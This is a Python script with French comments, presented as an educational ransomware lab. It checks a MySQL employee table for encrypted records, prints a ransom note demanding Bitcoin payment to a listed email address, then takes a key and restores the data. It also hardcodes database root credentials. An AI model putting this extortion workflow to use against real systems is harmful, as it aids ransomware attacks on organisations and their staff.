# ============================================
# LABORATOIRE RANSOMWARE - SCRIPT UNIFIE
# ============================================
# Description: Ce script verifie la presence de donnees chiffrees,
# affiche le message de rancon, permet la saisie de la cle publique
# et dechiffre automatiquement les donnees.
# Utilisation pedagogique uniquement.
# ============================================

import pymysql
import json
import base64
import sys
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from datetime import datetime

# ============================================
# CONFIGURATION BASE DE DONNEES
# ============================================
DB_CONFIG = {
    'host': '192.168.200.130',
    'user': 'root',
    'password': 'Root2026!',
    'database': 'Naomie_entreprise',
    'charset': 'utf8mb4'
}

# ============================================
# 1. VERIFICATION DES DONNEES CHIFFREES
# ============================================
def verifier_chiffrement():
    """Verifie si des donnees sont chiffrees dans la base"""
    try:
        conn = pymysql.connect(**DB_CONFIG)
        cursor = conn.cursor()
        
        cursor.execute("SHOW COLUMNS FROM salariée LIKE 'donnees_chiffrees'")
        if not cursor.fetchone():
            return False, 0, None
        
        cursor.execute("SELECT COUNT(*) FROM salariée WHERE donnees_chiffrees IS NOT NULL AND donnees_chiffrees != ''")
        count = cursor.fetchone()[0]
        
        if count > 0:
            cursor.execute("SELECT donnees_chiffrees FROM salariée WHERE donnees_chiffrees IS NOT NULL LIMIT 1")
            payload_b64 = cursor.fetchone()[0]
            cursor.close()
            conn.close()
            return True, count, payload_b64
        else:
            cursor.close()
            conn.close()
            return False, 0, None
            
    except Exception as e:
        print(f"Erreur de connexion a la base : {e}")
        return False, 0, None

# ============================================
# 2. AFFICHAGE DU MESSAGE DE RANCON
# ============================================
def afficher_message_rancon(count):
    """Affiche le message de rancon"""
    print("\n" + "="*80)
    print("="*80)
    print("=" + " "*78 + "=")
    print("=" + " "*12 + "   ALERTE RANSOMWARE - VOS DONNEES SONT CHIFFREES   " + " "*12 + "=")
    print("=" + " "*78 + "=")
    print("=" + "="*76 + "=")
    print("=" + " "*78 + "=")
    print("=" + f"  {count} enregistrement(s) ont ete chiffres dans votre base" + " "*22 + "=")
    print("=" + " "*78 + "=")
    print("=" + "  POUR RECUPERER VOS DONNEES :" + " "*42 + "=")
    print("=" + "  - Contactez l'attaquant : mpigajesse@gmail.com" + " "*30 + "=")
    print("=" + "  - Payez la rancon : 5000 euros en Bitcoin" + " "*37 + "=")
    print("=" + "  - Recevez la cle publique de dechiffrement" + " "*32 + "=")
    print("=" + "  - Dechiffrez vos donnees avec la cle publique" + " "*31 + "=")
    print("=" + " "*78 + "=")
    print("=" + "  ATTENTION :" + " "*56 + "=")
    print("=" + "     - Ne modifiez pas les donnees chiffrees" + " "*36 + "=")
    print("=" + "     - Toute tentative de forcage detruira les donnees" + " "*30 + "=")
    print("=" + "     - Vous avez 48 heures pour payer la rancon" + " "*33 + "=")
    print("=" + " "*78 + "=")
    print("=" + f"  DATE : {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}" + " "*38 + "=")
    print("=" + " "*78 + "=")
    print("="*80)
    print("="*80 + "\n")
    
    print("CONTACT : mpigajesse@gmail.com")
    print("PRIX : 5000 euros en Bitcoin")
    print("DELAI : 48 heures\n")
    
    print("INSTRUCTIONS :")
    print("   1. Envoyez un email a mpigajesse@gmail.com")
    print("   2. Attendez la cle publique en reponse")
    print("   3. Collez la cle publique ci-dessous")
    print("   4. Les donnees seront automatiquement dechiffrees\n")

# ============================================
# 3. SAISIE DE LA CLE PUBLIQUE (CORRIGEE)
# ============================================
def saisir_cle_publique():
    """Permet a l'utilisateur de saisir la cle publique"""
    print("SAISIE DE LA CLE PUBLIQUE DE DECHIFFREMENT")
    print("="*50)
    print("Apres avoir paye la rancon, vous recevrez une cle publique par email.")
    print("Collez la cle ci-dessous (avec ou sans les entetes PEM).")
    print("Terminez par Ctrl+D sur une nouvelle ligne.\n")
    
    print("Collez la cle publique :")
    
    lignes = []
    try:
        while True:
            ligne = input()
            lignes.append(ligne)
    except EOFError:
        pass
    
    cle_publique_text = "\n".join(lignes)
    
    if not cle_publique_text.strip():
        print("\nAucune cle saisie. Operation annulee.")
        return None
    
    # Si la clé n'a pas les entetes, les ajouter automatiquement
    if "BEGIN PUBLIC KEY" not in cle_publique_text:
        print("\nAjout automatique des entetes PEM...")
        cle_publique_text = "-----BEGIN PUBLIC KEY-----\n" + cle_publique_text + "\n-----END PUBLIC KEY-----"
    
    print("\nVerification de la cle publique...")
    
    try:
        public_key = serialization.load_pem_public_key(
            cle_publique_text.encode('utf-8'),
            backend=default_backend()
        )
        print("Cle publique valide.\n")
        return public_key
    except Exception as e:
        print(f"Cle publique invalide : {e}")
        print("Verifiez que vous avez copie la cle correctement.")
        print("La cle doit etre au format PEM :")
        print("   -----BEGIN PUBLIC KEY-----")
        print("   ... (contenu de la cle) ...")
        print("   -----END PUBLIC KEY-----")
        return None

# ============================================
# 4. DECHIFFREMENT DES DONNEES
# ============================================
def dechiffrer_donnees(payload_b64, public_key):
    """Dechiffre les donnees avec la cle publique"""
    try:
        payload = base64.b64decode(payload_b64)
        pos = 0
        
        taille_signature = int.from_bytes(payload[pos:pos+4], byteorder='big')
        pos += 4
        signature = payload[pos:pos+taille_signature]
        pos += taille_signature
        print(f"   Signature : {len(signature)} octets")
        
        taille_cle_aes = int.from_bytes(payload[pos:pos+4], byteorder='big')
        pos += 4
        cle_aes = payload[pos:pos+taille_cle_aes]
        pos += taille_cle_aes
        print(f"   Cle AES : {len(cle_aes)} octets")
        
        donnees_chiffrees_aes = payload[pos:]
        print(f"   Donnees chiffrees : {len(donnees_chiffrees_aes)} octets")
        
        try:
            public_key.verify(
                signature,
                cle_aes,
                padding.PKCS1v15(),
                hashes.SHA256()
            )
            print("   Signature VERIFIEE avec la cle PUBLIQUE\n")
        except Exception:
            print("   Signature INVALIDE !")
            print("   Les donnees ont ete modifiees ou la cle est incorrecte.")
            return False
        
        iv = donnees_chiffrees_aes[:16]
        donnees_chiffrees_crypted = donnees_chiffrees_aes[16:]
        
        cipher = Cipher(algorithms.AES(cle_aes), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        data_padded = decryptor.update(donnees_chiffrees_crypted) + decryptor.finalize()
        
        pad_len = data_padded[-1]
        json_data = data_padded[:-pad_len]
        
        data_list = json.loads(json_data.decode('utf-8'))
        print(f"   {len(data_list)} enregistrements dechiffres avec succes.\n")
        
        return restaurer_donnees(data_list)
        
    except Exception as e:
        print(f"Erreur de dechiffrement : {e}")
        return False

# ============================================
# 5. RESTAURATION DES DONNEES
# ============================================
def restaurer_donnees(data_list):
    """Restaure les donnees dans la base"""
    try:
        conn = pymysql.connect(**DB_CONFIG)
        cursor = conn.cursor()
        
        print("Restauration des donnees...")
        
        cursor.execute("SELECT id FROM salariée WHERE donnees_chiffrees IS NOT NULL")
        ids = [row[0] for row in cursor.fetchall()]
        
        for i, id_val in enumerate(ids):
            if i >= len(data_list):
                break
            d = data_list[i]
            
            cursor.execute("""
                UPDATE salariée
                SET nom = %s,
                    prénom = %s,
                    email = %s,
                    poste = %s,
                    salaire = %s,
                    date_embauche = %s,
                    active = %s,
                    donnees_chiffrees = NULL
                WHERE id = %s
            """, (
                d.get('nom'),
                d.get('prénom'),
                d.get('email'),
                d.get('poste'),
                float(d.get('salaire')) if d.get('salaire') and d.get('salaire') != 'None' else None,
                d.get('date_embauche') if d.get('date_embauche') and d.get('date_embauche') != 'None' else None,
                d.get('active', 1),
                id_val
            ))
        
        conn.commit()
        cursor.close()
        conn.close()
        
        print(f"{len(ids)} enregistrements restaurés avec succes !\n")
        
        afficher_donnees_restaurees()
        return True
        
    except Exception as e:
        print(f"Erreur lors de la restauration : {e}")
        return False

# ============================================
# 6. AFFICHAGE DES DONNEES RESTAUREES
# ============================================
def afficher_donnees_restaurees():
    """Affiche les donnees restaurees"""
    try:
        conn = pymysql.connect(**DB_CONFIG)
        cursor = conn.cursor()
        
        cursor.execute("SELECT id, nom, prénom, email, poste, salaire, date_embauche, active FROM salariée")
        rows = cursor.fetchall()
        cursor.close()
        conn.close()
        
        print("="*70)
        print("DONNEES RESTAUREES")
        print("="*70 + "\n")
        
        for row in rows:
            print(f"ID: {row[0]}")
            print(f"  Nom: {row[1]}")
            print(f"  Prénom: {row[2]}")
            print(f"  Email: {row[3]}")
            print(f"  Poste: {row[4]}")
            print(f"  Salaire: {row[5]} euros")
            print(f"  Date embauche: {row[6]}")
            print(f"  Actif: {'Oui' if row[7] else 'Non'}")
            print("-"*40)
            
        print("\nTOUTES LES DONNEES ONT ETE RECUPEREES AVEC SUCCES !")
        print("="*70)
        
    except Exception as e:
        print(f"Erreur : {e}")

# ============================================
# 7. FONCTION PRINCIPALE
# ============================================
def main():
    print("="*70)
    print("VERIFICATION DE L'INTEGRITE DES DONNEES")
    print("="*70 + "\n")
    
    chiffre, count, payload_b64 = verifier_chiffrement()
    
    if not chiffre:
        print("Aucune donnee chiffree trouvee. Tout est normal.")
        return
    
    afficher_message_rancon(count)
    
    print("\n" + "="*70)
    print("DECHIFFREMENT DES DONNEES")
    print("="*70 + "\n")
    
    public_key = saisir_cle_publique()
    
    if public_key is None:
        print("Operation annulee.")
        return
    
    print("\nDechiffrement en cours...\n")
    success = dechiffrer_donnees(payload_b64, public_key)
    
    if success:
        print("\nOPERATION TERMINEE AVEC SUCCES !")
        print("Toutes vos donnees ont ete recuperees.")
        print("La cle privee n'a jamais ete partagee.")
    else:
        print("\nEchec du dechiffrement. Verifiez la cle publique.")

# ============================================
# EXECUTION PRINCIPALE
# ============================================
if __name__ == "__main__":
    main()
